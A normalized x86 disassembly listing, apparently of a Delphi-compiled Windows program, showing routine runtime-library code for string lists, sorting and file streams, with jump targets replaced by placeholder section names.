mov eax [ ebp - 0x4 ]
call sub_4143dc
retn
sub_414bf8
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_4159c4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414c43
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c4a
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_414c50
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414c9d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404138
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_415774
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414ca4
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_414cb0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_4054cc
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_414ce4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414d27
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404070
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d2e
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_414d34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414de8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414320
xor edx edx
push ebp
push sub_414dcb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414dd2
mov eax [ ebp - 0x4 ]
call sub_4143dc
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_403f68
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_414df8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414e6e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_418f4c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_418f54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414e75
lea eax [ ebp - 0xc ]
call sub_403e78
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418ff4
inc esi
dec ebx
jne r-xdata
sub_414ea0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_414ebc
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414158
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4048f4
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_414f24
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4144d4
jmp r-xdata
sub_414fc0
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_4048f4
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_415000
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4144d4
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_4049e0
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41506c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4144d4
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_4144d4
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4150c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_4150c8
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_4150ec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_415164
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4144d4
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403ecc
pop edi
pop esi
pop ebx
retn
sub_4151a0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4144d4
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_4151c8
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_4151fc
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_41479c
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_415248
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4144d4
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4144d4
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41529c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_4151c8
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403ecc
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028b8
sub_415314
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4144d4
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4144d4
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403ecc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415370
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4144d4
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_4153b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4150c8
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4153b0
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_415460
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_4154bc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_4153b0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_415510
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_415544
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_4155a8
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_4155fc
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403078
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3fc
call sub_4038b4
mov esp ebp
pop ebp
retn
sub_415648
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_403070
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_4155fc
pop ecx
mov eax [ ebx ]
call sub_4030b4
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_4155fc
pop ecx
sub_4156cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41573c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
sub_415774
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
sub_4157ac
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_415530
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026bc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_415888
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41588f
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4026dc
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41573c
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_415774
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_4158a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_415f24
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4158f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_417f58
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4158f7
mov eax [ ebp - 0x8 ]
call sub_403128
retn
sub_415900
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_41595c
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_4081cc
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41599c
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40c7b0
pop ebx
pop ebp
retn 0x8
sub_4159c4
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_415a08
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_415a08
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_415b31
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_40344c
movzx edx di
mov eax esi
call sub_4080f0
mov ecx eax
xor edx edx
mov eax ebx
call sub_415900
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_40816c
mov ecx eax
xor edx edx
mov eax ebx
call sub_415900
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415b38
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403e9c
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_40830c
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40aafc
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3fc
call sub_4038b4
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40830c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40aafc
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3fc
call sub_4038b4
jmp r-xdata
sub_415b38
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_415b5c
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
call sub_408204
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_415b98
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028b8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_415bd0
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_415bf4
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax esi
call sub_415c20
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_415c38
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_415530
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41573c
sub_415c70
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_415b90
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_415c98
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_415c70
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_415cc4
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
